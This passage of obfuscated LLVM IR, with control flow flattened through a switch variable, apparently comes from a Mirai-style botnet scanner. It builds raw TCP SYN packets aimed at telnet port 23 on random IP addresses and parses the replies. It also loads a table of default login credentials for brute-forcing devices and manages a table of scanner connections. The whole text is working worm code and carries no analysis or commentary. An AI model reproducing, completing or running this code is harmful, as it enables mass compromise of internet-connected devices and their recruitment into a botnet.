  ret void

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @util_local_addr()
  store i32 %56, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %57 = call i64 @time(i64* null) #6
  %58 = trunc i64 %57 to i32
  store i32 %58, i32* @fake_time, align 4
  %59 = call noalias i8* @calloc(i64 256, i64 296) #6
  %60 = bitcast i8* %59 to %struct.scanner_connection*
  store %struct.scanner_connection* %60, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  store i32 1651285089, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %1, align 4
  %63 = icmp slt i32 %62, 256
  %64 = select i1 %63, i32 169505170, i32 361423705
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %67 = load i32, i32* %1, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i64 %68
  %70 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i32 0, i32 3
  store i32 0, i32* %70, align 8
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %72 = load i32, i32* %1, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i64 %73
  %75 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %74, i32 0, i32 1
  store i32 -1, i32* %75, align 8
  store i32 -2134816712, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i32, i32* %1, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %1, align 4
  store i32 1651285089, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %80, i32* @rsck, align 4
  %81 = icmp eq i32 %80, -1
  %82 = select i1 %81, i32 -1098590628, i32 -810029824
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 -810029824, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* @rsck, align 4
  %86 = load i32, i32* @rsck, align 4
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i32 0)
  %88 = or i32 2048, %87
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 4, i32 %88)
  store i32 1, i32* %1, align 4
  %90 = load i32, i32* @rsck, align 4
  %91 = bitcast i32* %1 to i8*
  %92 = call i32 @setsockopt(i32 %90, i32 0, i32 3, i8* %91, i32 4) #6
  %93 = icmp ne i32 %92, 0
  %94 = select i1 %93, i32 1779617368, i32 1817839278
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* @rsck, align 4
  %97 = call i32 @close(i32 %96)
  store i32 1817839278, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  store i32 -527311589, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = call i32 @rand_next()
  %101 = and i32 %100, 65535
  %102 = trunc i32 %101 to i16
  store i16 %102, i16* %2, align 2
  store i32 -8075985, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i16, i16* %2, align 2
  %105 = call zeroext i16 @ntohs(i16 zeroext %104) #7
  %106 = zext i16 %105 to i32
  %107 = icmp slt i32 %106, 1024
  %108 = select i1 %107, i32 -527311589, i32 -1951996982
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %110 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i64 1
  %112 = bitcast %struct.iphdr* %111 to %struct.tcphdr*
  store %struct.tcphdr* %112, %struct.tcphdr** %4, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %114 = bitcast %struct.iphdr* %113 to i8*
  %115 = load i8, i8* %114, align 4
  %116 = and i8 %115, -16
  %117 = or i8 %116, 5
  store i8 %117, i8* %114, align 4
  %118 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %119 = bitcast %struct.iphdr* %118 to i8*
  %120 = load i8, i8* %119, align 4
  %121 = and i8 %120, 15
  %122 = or i8 %121, 64
  store i8 %122, i8* %119, align 4
  %123 = call zeroext i16 @htons(i16 zeroext 40) #7
  %124 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 2
  store i16 %123, i16* %125, align 2
  %126 = call i32 @rand_next()
  %127 = trunc i32 %126 to i16
  %128 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 3
  store i16 %127, i16* %129, align 4
  %130 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 5
  store i8 64, i8* %131, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 6
  store i8 6, i8* %133, align 1
  %134 = call zeroext i16 @htons(i16 zeroext 23) #7
  %135 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 1
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %2, align 2
  %138 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i32 0, i32 0
  store i16 %137, i16* %139, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 4
  %142 = load i16, i16* %141, align 4
  %143 = and i16 %142, -241
  %144 = or i16 %143, 80
  store i16 %144, i16* %141, align 4
  %145 = call i32 @rand_next()
  %146 = and i32 %145, 65535
  %147 = trunc i32 %146 to i16
  %148 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 5
  store i16 %147, i16* %149, align 2
  %150 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -513
  %154 = or i16 %153, 512
  store i16 %154, i16* %151, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i16 zeroext 13)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.14, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.17, i32 0, i32 0), i16 zeroext 13)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i16 zeroext 13)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 6)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 3)
  store i32 1790762428, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %156 = load i32, i32* @fake_time, align 4
  %157 = load i32, i32* %10, align 4
  %158 = icmp ne i32 %156, %157
  %159 = select i1 %158, i32 1018932202, i32 1531473022
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i32, i32* @fake_time, align 4
  store i32 %161, i32* %10, align 4
  store i32 0, i32* %1, align 4
  store i32 611158556, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %1, align 4
  %164 = icmp slt i32 %163, 384
  %165 = select i1 %164, i32 1710399765, i32 6480873
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %167, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %168 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i64 1
  %170 = bitcast %struct.iphdr* %169 to %struct.tcphdr*
  store %struct.tcphdr* %170, %struct.tcphdr** %16, align 8
  %171 = call i32 @rand_next()
  %172 = trunc i32 %171 to i16
  %173 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 3
  store i16 %172, i16* %174, align 4
  %175 = load i32, i32* @LOCAL_ADDR, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 8
  store i32 %175, i32* %177, align 4
  %178 = call i32 @get_random_ip()
  %179 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 9
  store i32 %178, i32* %180, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 7
  store i16 0, i16* %182, align 2
  %183 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %184 = bitcast %struct.iphdr* %183 to i16*
  %185 = call zeroext i16 @checksum_generic(i16* %184, i32 20)
  %186 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 7
  store i16 %185, i16* %187, align 2
  %188 = call zeroext i16 @htons(i16 zeroext 23) #7
  %189 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 1
  store i16 %188, i16* %190, align 2
  %191 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 9
  %193 = load i32, i32* %192, align 4
  %194 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 2
  store i32 %193, i32* %195, align 4
  %196 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 6
  store i16 0, i16* %197, align 4
  %198 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %199 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %200 = bitcast %struct.tcphdr* %199 to i8*
  %201 = call zeroext i16 @htons(i16 zeroext 20) #7
  %202 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %198, i8* %200, i16 zeroext %201, i32 20)
  %203 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 6
  store i16 %202, i16* %204, align 4
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %205, align 4
  %206 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 9
  %208 = load i32, i32* %207, align 4
  %209 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %210 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %209, i32 0, i32 0
  store i32 %208, i32* %210, align 4
  %211 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 1
  %213 = load i16, i16* %212, align 2
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %213, i16* %214, align 2
  %215 = load i32, i32* @rsck, align 4
  %216 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %217 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %217, %struct.sockaddr** %216, align 8
  %218 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %219 = load %struct.sockaddr*, %struct.sockaddr** %218, align 8
  %220 = call i64 @sendto(i32 %215, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %219, i32 16)
  store i32 1254687635, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* %1, align 4
  %223 = add nsw i32 %222, 1
  store i32 %223, i32* %1, align 4
  store i32 611158556, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  store i32 1531473022, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %228 = bitcast i8* %227 to %struct.iphdr*
  store %struct.iphdr* %228, %struct.iphdr** %20, align 8
  %229 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i64 1
  %231 = bitcast %struct.iphdr* %230 to %struct.tcphdr*
  store %struct.tcphdr* %231, %struct.tcphdr** %21, align 8
  %232 = call i32* @__errno_location() #7
  store i32 0, i32* %232, align 4
  %233 = load i32, i32* @rsck, align 4
  %234 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %235 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %235, align 8
  %236 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %237 = load %struct.sockaddr*, %struct.sockaddr** %236, align 8
  %238 = call i64 @recvfrom(i32 %233, i8* %234, i64 1514, i32 16384, %struct.sockaddr* %237, i32* null)
  %239 = trunc i64 %238 to i32
  store i32 %239, i32* %18, align 4
  %240 = load i32, i32* %18, align 4
  %241 = icmp sle i32 %240, 0
  %242 = select i1 %241, i32 -1881788116, i32 704553642
  store i32 %242, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = call i32* @__errno_location() #7
  %245 = load i32, i32* %244, align 4
  %246 = icmp eq i32 %245, 11
  %247 = select i1 %246, i32 -1881788116, i32 -450628029
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = call i32* @__errno_location() #7
  %250 = load i32, i32* %249, align 4
  %251 = icmp eq i32 %250, 11
  %252 = select i1 %251, i32 -1881788116, i32 67001260
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  store i32 95879908, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i32, i32* %18, align 4
  %256 = sext i32 %255 to i64
  %257 = icmp ult i64 %256, 40
  %258 = select i1 %257, i32 -928905721, i32 -207010120
  store i32 %258, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 9
  %263 = load i32, i32* %262, align 4
  %264 = load i32, i32* @LOCAL_ADDR, align 4
  %265 = icmp ne i32 %263, %264
  %266 = select i1 %265, i32 772413417, i32 1788680290
  store i32 %266, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 6
  %271 = load i8, i8* %270, align 1
  %272 = zext i8 %271 to i32
  %273 = icmp ne i32 %272, 6
  %274 = select i1 %273, i32 1826171302, i32 -309522676
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %277 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 0
  %279 = load i16, i16* %278, align 4
  %280 = zext i16 %279 to i32
  %281 = call zeroext i16 @htons(i16 zeroext 23) #7
  %282 = zext i16 %281 to i32
  %283 = icmp ne i32 %280, %282
  %284 = select i1 %283, i32 -2070333698, i32 -1443171085
  store i32 %284, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %288 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %287, i32 0, i32 1
  %289 = load i16, i16* %288, align 2
  %290 = zext i16 %289 to i32
  %291 = load i16, i16* %2, align 2
  %292 = zext i16 %291 to i32
  %293 = icmp ne i32 %290, %292
  %294 = select i1 %293, i32 1536897623, i32 -634758184
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 4
  %299 = load i16, i16* %298, align 4
  %300 = lshr i16 %299, 9
  %301 = and i16 %300, 1
  %302 = icmp ne i16 %301, 0
  %303 = select i1 %302, i32 -530815139, i32 -470340072
  store i32 %303, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 4
  %308 = load i16, i16* %307, align 4
  %309 = lshr i16 %308, 12
  %310 = and i16 %309, 1
  %311 = icmp ne i16 %310, 0
  %312 = select i1 %311, i32 -326561540, i32 -2094192294
  store i32 %312, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %316 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %315, i32 0, i32 4
  %317 = load i16, i16* %316, align 4
  %318 = lshr i16 %317, 10
  %319 = and i16 %318, 1
  %320 = icmp ne i16 %319, 0
  %321 = select i1 %320, i32 1609871731, i32 -2017800219
  store i32 %321, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %325 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %324, i32 0, i32 4
  %326 = load i16, i16* %325, align 4
  %327 = lshr i16 %326, 8
  %328 = and i16 %327, 1
  %329 = icmp ne i16 %328, 0
  %330 = select i1 %329, i32 -1413150149, i32 2135866578
  store i32 %330, i32* %switchVar
  br label %loopEnd

; <label>:331:                                    ; preds = %loopEntry
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 3
  %335 = load i32, i32* %334, align 4
  %336 = call i32 @ntohl(i32 %335) #7
  %337 = sub i32 %336, 1
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 8
  %341 = load i32, i32* %340, align 4
  %342 = icmp ne i32 %338, %341
  %343 = select i1 %342, i32 -1240920520, i32 832790991
  store i32 %343, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %346 = load i32, i32* %9, align 4
  store i32 %346, i32* %18, align 4
  store i32 1290113479, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i32, i32* %18, align 4
  %349 = icmp slt i32 %348, 256
  %350 = select i1 %349, i32 -1389503669, i32 -1964174806
  store i32 %350, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %353 = load i32, i32* %18, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %352, i64 %354
  %356 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %355, i32 0, i32 3
  %357 = load i32, i32* %356, align 8
  %358 = icmp eq i32 %357, 0
  %359 = select i1 %358, i32 1556447991, i32 -1057863185
  store i32 %359, i32* %switchVar
  br label %loopEnd

